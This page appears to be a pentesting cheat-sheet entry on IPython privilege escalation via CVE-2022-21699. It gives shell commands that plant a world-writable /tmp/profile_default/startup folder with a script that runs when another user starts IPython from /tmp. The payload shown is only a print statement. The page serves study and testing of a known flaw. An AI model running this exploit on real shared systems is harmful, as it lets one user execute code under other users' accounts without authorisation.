---
title: IPython Privilege Escalation
desc: Interective Python (IPython) is a command shell for interective computing in multiple programming languages.
tags: [IPython, Python, PrivEsc, Privilege]
alts: []
render_with_liquid: false
---

## [CVE-2022-21699](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x){:target="_blank"}

```sh
# -m: file mode (rwx)
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/exploit.py
```